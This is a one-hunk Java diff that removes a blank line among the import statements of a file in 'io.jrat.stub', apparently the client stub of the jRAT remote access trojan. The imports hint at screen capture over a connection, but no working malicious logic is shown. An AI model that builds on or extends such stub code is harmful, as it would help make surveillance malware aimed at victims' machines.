@@ -2,7 +2,6 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
 import io.jrat.stub.utils.ScreenUtils;
-
 import java.awt.Rectangle;
 import java.awt.Toolkit;
 import java.util.Random;
